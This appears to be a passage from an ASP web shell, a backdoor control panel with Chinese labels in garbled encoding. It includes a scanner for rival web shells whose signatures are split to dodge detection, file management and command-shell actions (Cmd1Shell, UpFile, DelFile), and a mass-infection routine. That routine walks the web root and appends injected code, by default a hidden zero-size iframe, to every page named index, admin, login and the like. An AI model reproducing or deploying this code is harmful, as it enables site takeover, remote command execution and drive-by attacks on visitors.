RRS "<div id=""updateInfo"" style=""background:ffffe1;border:1px solid #89441f;padding:4px;display:none""></div>"
RRS "ɨ����ϣ�һ������ļ���<font color=""#FF0000"">"&SumFolders&"</font>�����ļ�<font color=""#FF0000"">"&SumFiles&"</font>�������ֿ��ɵ�<font color=""#FF0000"">"&Sun&"</font>��"
RRS "<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""8"" bordercolor=""#999999"" style=""font-size:12px;border-collapse:collapse;line-height:130%;clear:both;""><tr>"
If request.Form("radiobutton") = "sws" Then
			   RRS "<td width=""20%"">�ļ����·��</td>"
			   RRS "<td width=""20%"">������</td>"
			   RRS "<td width=""40%"">����</td>"
			   RRS "<td width=""20%"">����/�޸�ʱ��</td>"
else   
			   RRS "<td width=""50%"">�ļ����·��</td>"
			   RRS "<td width=""25%"">�ļ�����ʱ��</td>"
			   RRS "<td width=""25%"">�޸�ʱ��</td>"
end if
			   RRS "</tr>"
			   RRS Report
			   RRS "<br/></table>"
timer2 = timer
thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
RRS "<br><font size=""2"">��ҳִ�й�����"&thetime&"����</font>"
	end if
Sub ShowAllFile(Path)
	Set F1SO = CreateObject("Scripting.FileSystemObject")
	if not F1SO.FolderExists(path) then exit sub
	Set f = F1SO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call ScanFile(Path&Temp&"\"&myfile.name, "")
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F1SO = Nothing
End Sub
Sub ScanFile(FilePath, InFile)
Server.ScriptTimeout=999999999
	If InFile <> "" Then
		Infiles = "<font color=red>���ļ���<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>�ļ�����ִ��</font>"
	End If
	Set FSO1s = CreateObject("Scripting.FileSystemObject")
	on error resume next
	set ofile = FSO1s.OpenTextFile(FilePath)
	filetxt = Lcase(ofile.readall())
	If err Then Exit Sub end if
	if len(filetxt)>0 then
		filetxt = vbcrlf & filetxt
		temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a><br />"
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"	
			If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell ���� clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End if
			If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application ���� clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			Set regEx = New RegExp
			regEx.IgnoreCase = True
			regEx.Global = True
			regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>�ƺ��ű���������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\bEv"&"al\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()��������ִ������ASP����<br>����javascript������Ҳ����ʹ�ã��п������󱨡�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "[^.]\bExe"&"cute\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()��������ִ������ASP����</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\.(Open|Create)TextFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.CreateTextFile|.OpenTextFile</td><td>ʹ����FSO��CreateTextFile|OpenTextFile��д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\.SaveToFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.SaveToFile</td><td>ʹ����Stream��SaveToFile����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\.Save\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Save</td><td>ʹ����XMLHTTP��Save����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
		If regEx.Test(filetxt) Then
			Report = Report&"<tr><td>"&temp&"</td><td>Server.Exec"&"ute</td><td><font color=red>���ܸ��ټ��Server.e"&"xecute()����ִ�е��ļ���</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
			Sun = Sun + 1
		End If
		Set Matches = Nothing
		Set regEx = Nothing
		Set XregEx = New RegExp
		XregEx.IgnoreCase = True
		XregEx.Global = True
		XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
		Set XMatches = XregEx.Execute(filetxt)
		For Each Match in XMatches
			tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
			srcSeek = InStr(1, tmpLake2, "src", 1)
			If srcSeek > 0 Then
				srcSeek2 = instr(srcSeek, tmpLake2, "=")
				For i = 1 To 50
					tmp = Mid(tmpLake2, srcSeek2 + i, 1)
					If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
						Exit For
					End If
				Next
				If tmp = """" Then
					tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
				Else
					If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
					If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
					If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
					If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
				End If
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "CreateO"&"bject[ |\t]*\(.*\)"
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """") = 0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
				Report = Report&"<tr><td>"&temp&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject����ʹ���˱��μ���"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				exit sub
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
	end if
	set ofile = nothing
	set FSO1s = nothing
End Sub
Function CheckExt(FileExt)
	If DimFileExt = "*" Then CheckExt = True
	Ext = Split(DimFileExt,",")
	For i = 0 To Ubound(Ext)
		If Lcase(FileExt) = Ext(i) Then 
			CheckExt = True
			Exit Function
		End If
	Next
End Function
Function GetDateModify(filepath)
	Set F2SO = CreateObject("Scripting.FileSystemObject")
    Set f = F2SO.GetFile(filepath) 
	s = f.DateLastModified 
	set f = nothing
	set F2SO = nothing
	GetDateModify = s
End Function
Function GetDateCreate(filepath)
	Set F3SO = CreateObject("Scripting.FileSystemObject")
    Set f = F3SO.GetFile(filepath) 
	s = f.DateCreated 
	set f = nothing
	set F3SO = nothing
	GetDateCreate = s
End Function
Function tURLEncode(Str)
	temp = Replace(Str, "%", "%25")
	temp = Replace(temp, "#", "%23")
	temp = Replace(temp, "&", "%26")
	tURLEncode = temp
End Function
Sub ShowAllFile2(Path)
	Set F4SO = CreateObject("Scripting.FileSystemObject")
	if not F4SO.FolderExists(path) then exit sub
	Set f = F4SO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call IsFind(Path&"\"&myfile.name)
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile2 path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F4SO = Nothing
End Sub
Sub IsFind(thePath)
	theDate = GetDateModify(thePath)
	on error resume next
	theTmp = Mid(theDate, 1, Instr(theDate, " ") - 1)
	if err then exit Sub
	xDate = Split(request.Form("Search_Date"),";")
	If request.Form("Search_Date") = "ALL" Then ALLTime = True
	For i = 0 To Ubound(xDate)
		If theTmp = xDate(i) or ALLTime = True Then 
			If request("Search_Content") <> "" Then
				Set FSO2s = CreateObject("Scripting.FileSystemObject")
				set ofile = FSO2s.OpenTextFile(thePath, 1, false, -2)
				filetxt = Lcase(ofile.readall())
				If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then
					temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
					Report = Report&"<tr><td>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
					Sun = Sun + 1
					Exit Sub
				End If
				ofile.close()
				Set ofile = Nothing
				Set FSO2s = Nothing
			Else
				temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a> "
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"	
				Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
				Sun = Sun + 1
				Exit Sub
			End If
		End If
	Next
End Sub
  Case "plgm"
Server.ScriptTimeout=1000000 
Response.Buffer=False 
	RRS("<html><head><style>body{margin:0px;font-size:12px;color:#eee;background-color: #444;}a{color:#fff}.show{visibility: visible;}</style></head><body>")
RRS ("<b>��ǰ��վ����·��Ϊ:")&Server.MapPath("/")&("</b>")
ASP_SELF=Request.ServerVariables("PATH_INFO") 
s=Request("fd") 
if s="" then s=Server.MapPath("/")
ex=Request("ex") 
pth=Request("pth") 
newcnt=Request("newcnt") 
addcode = Request("code")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
If ex<>"" AND pth<>"" Then 
	select Case ex 
		Case "edit" 
			CALL file_show(pth) 
		Case "save" 
			CALL file_save(pth) 
	End select 
Else 
	RRS("<form method=""POST""> ")
	RRS("<table width=""551"" border=""0"" style=""font-size:12px;"">")
	RRS("<tr>")
	RRS("<td width=""109"">Ҫ������ļ��� (����·��):</td>")
	RRS("<td width=""359""><input type=""text"" name=""fd"" value="""&s&""" size=""52""></td>")
	RRS("<td width=""69"">&nbsp;</td>")
	RRS("</tr><tr><td>Ҫ����Ĵ���:</td>")
	RRS("<td><textarea name=""code"" cols=""50"" rows=""3"">"&addcode&"</textarea></td>")
	RRS("<td><input name=""submit"" type=""submit"" value=""��ʼ""></td>")
	RRS("</tr></table></form> ")
End If 
Function IsPattern(patt,str) 
Set regEx=New RegExp 
regEx.Pattern=patt 
regEx.IgnoreCase=True 
retVal=regEx.Test(str) 
Set regEx=Nothing 
If retVal=True Then 
IsPattern=True 
Else 
IsPattern=False 
End If 
End Function 
if request.form("submit")<>"" then
	If s="" or addcode="" Then
		RRS "<font color=red>����������·�������!</font>"
		response.end
	else If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then sch s 
	End If
end if 
Sub sch(s) 
oN eRrOr rEsUmE nExT 
Set fs=Server.createObject("Scripting.FileSystemObject") 
Set fd=fs.GetFolder(s) 
Set fi=fd.Files 
Set sf=fd.SubFolders 
For Each f in fi 
rtn=f.path 
step_all rtn 
Next 
If sf.Count<>0 Then 
For Each l In sf 
sch l 
Next 
End If 
End Sub 
Sub step_all(agr) 
retVal=IsPattern("(\\|\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|login|diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|list|shop|err|nc|ad|flash|text|admin_upfile|admin_upload|upfile_load|upfile_soft|upfile_photo|upfile_softpic|vip|505)\.(htm|html|asp|php|jsp|aspx|cgi|js)\b",agr) 
If retVal Then 
step1 agr 
step2 agr 
Else 
Exit Sub 
End If 
End Sub 
Sub step1(str1)
RRS "<div style='line-height:20px'>�� "&str1&" _"
RRs "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DownFile"")' class='am' title='����'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""EditFile"")' class='am' title='�༭'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a></div>"
End Sub 
Sub step2(str2) 
Set fs=Server.createObject("Scripting.FileSystemObject") 
isExist=fs.FileExists(str2) 
If isExist Then 
Set f=fs.GetFile(str2) 
Set f_addcode=f.OpenAsTextStream(8,-2) 
f_addcode.Write addcode 
f_addcode.Close 
Set f=Nothing 
End If 
Set fs=Nothing 
End Sub 
Err.Clear
  Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
  Case "DownFile":DownFile FName:ShowErr()
  Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
  Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
  Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
  Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
  Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
  Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
  Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
  Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
  Case "UpFile":UpFile()
  Case "Cmd1Shell":Cmd1Shell()
  Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL
  Case "CreateMdb":CreateMdb FName
  Case "CompactMdb":CompactMdb FName
  Case "DbManager":DbManager()
  Case "Course":Course()
  Case "ServerInfo":ServerInfo()
  Case Else MainForm()
End Select
ShowErr()
RRS"</body></html>"
%>